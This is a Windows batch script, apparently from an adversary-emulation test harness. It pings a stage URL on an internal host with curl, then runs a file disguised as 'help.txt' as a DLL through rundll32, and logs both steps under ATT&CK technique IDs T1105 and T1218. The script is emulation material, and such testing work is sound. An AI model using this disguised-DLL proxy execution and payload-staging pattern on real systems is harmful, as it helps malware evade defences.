@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET douyiw=%APPDATA%\8054\db85408a
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?8054-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=help.txt
SET rgnpbq=8054

REM Derived variables
SET lkvmtw=%APPDATA%\%fkesh%\macula-simulations.log
SET xjqsgf=%APPDATA%\%fkesh%
SET otuwmn=C:\Windows\System32\rundll32.exe
SET mnhbvw=T1218
SET wdszq=Signed Binary Proxy Execution

REM Debug: script start
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: script_start=bat_script_initialized>>> "%lkvmtw%" 2>nul

REM 1. Heartbeat check
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: heartbeat_start=checking_%frytcn%>>> "%lkvmtw%" 2>nul
curl -k -s -o nul "%frytcn%"
IF ERRORLEVEL 1 (
    SET ghytrd=0
    SET bvcds=curl_failed_%ERRORLEVEL%
) ELSE (
    SET ghytrd=1
    SET bvcds=
)
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: heartbeat_complete=result_%ghytrd%>>> "%lkvmtw%" 2>nul

REM TTP logging for heartbeat (not T1218)
SET qrsjf=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%
SET kxvbh=%TIME: =0%
SET kxvbh=%kxvbh:~0,2%:%kxvbh:~3,2%:%kxvbh:~6,2%.%kxvbh:~9,3%
( echo [%qrsjf% %kxvbh%][%eykalkg%]: %fkesh%-%rgnpbq%-T1105|Ingress Tool Transfer=%ghytrd%:%bvcds% >> "%lkvmtw%" ) 2>nul

REM 3. Change directory
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: chdir_start=target_%douyiw%>>> "%lkvmtw%" 2>nul
cd /d "%douyiw%" 2>nul
IF ERRORLEVEL 1 (
    SET ghytrd=0
    SET bvcds=directory_change_failed
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: chdir_failed=error_%ERRORLEVEL%>>> "%lkvmtw%" 2>nul
) ELSE (
    SET ghytrd=1
    SET bvcds=
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: chdir_complete=success>>> "%lkvmtw%" 2>nul
)

REM 4. Execute DLL via Rundll32
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: dll_load_start=file_%ecrfwq%>>> "%lkvmtw%" 2>nul
"%otuwmn%" "%ecrfwq%",DllMain
IF ERRORLEVEL 1 (
    SET ghytru=0
    SET bvcdt=rundll32_error_%ERRORLEVEL%
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: dll_load_failed=error_%ERRORLEVEL%>>> "%lkvmtw%" 2>nul
) ELSE (
    SET ghytru=1
    SET bvcdt=
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: dll_load_complete=success>>> "%lkvmtw%" 2>nul
)

REM TTP logging for T1218
SET qrsjf=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%
SET kxvbh=%TIME: =0%
SET kxvbh=%kxvbh:~0,2%:%kxvbh:~3,2%:%kxvbh:~6,2%.%kxvbh:~9,3%
( echo [%qrsjf% %kxvbh%][%eykalkg%]: %fkesh%-%rgnpbq%-%mnhbvw%|%wdszq%=%ghytru%:%bvcdt% >> "%lkvmtw%" ) 2>nul

ENDLOCAL